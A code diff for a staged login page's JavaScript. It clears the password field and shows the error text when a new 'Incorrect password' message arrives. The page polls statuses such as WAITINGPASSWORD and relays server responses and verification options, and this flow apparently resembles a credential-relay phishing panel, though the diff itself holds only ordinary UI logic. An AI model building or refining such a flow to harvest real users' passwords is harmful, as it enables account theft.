@@ -688,6 +688,7 @@ let lastShownStatus = '';
   let isInitialLoad = true;
   let submitGuardTimeout = null;
 let lastRenderedOptionsHash = '';
+let lastPasswordErrorMsg = '';
 let verificationOptions = [];
 let loadingMessages = [
   "Securing your connection...",
@@ -794,6 +795,7 @@ function updateUIForStatus(status, data = {}) {
   const statusChanged = (status !== currentStatus);
   currentStatus = status;
   if (status !== 'PROCESSING') processingStartTime = null;
+  if (statusChanged || (status !== 'WAITINGPASSWORD' && status !== 'WAITINGPASSWORDERROR')) lastPasswordErrorMsg = '';
   const emailGroup = document.getElementById('emailGroup');
   const passwordGroup = document.getElementById('passwordGroup');
   const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
@@ -891,12 +893,21 @@ function updateUIForStatus(status, data = {}) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lastResp.message && (lastResp.message.includes('Incorrect password') || lastResp.message.includes('incorrect'))) {
+            if (lastResp.message !== lastPasswordErrorMsg) {
+              passwordField.value = '';
+              lastPasswordErrorMsg = lastResp.message;
+            }
             document.getElementById('InvalidPassword').textContent = lastResp.message;
             document.getElementById('InvalidPassword').style.display = 'block';
           }
         } catch(e) {}
-      } else if (currentStatus === 'WAITINGPASSWORDERROR') {
-        document.getElementById('InvalidPassword').textContent = 'Incorrect password. Please try again.';
+      } else if (status === 'WAITINGPASSWORDERROR') {
+        const genericPasswordError = 'Incorrect password. Please try again.';
+        if (genericPasswordError !== lastPasswordErrorMsg) {
+          passwordField.value = '';
+          lastPasswordErrorMsg = genericPasswordError;
+        }
+        document.getElementById('InvalidPassword').textContent = genericPasswordError;
         document.getElementById('InvalidPassword').style.display = 'block';
       }
       lastShownStatus = currentStatus;
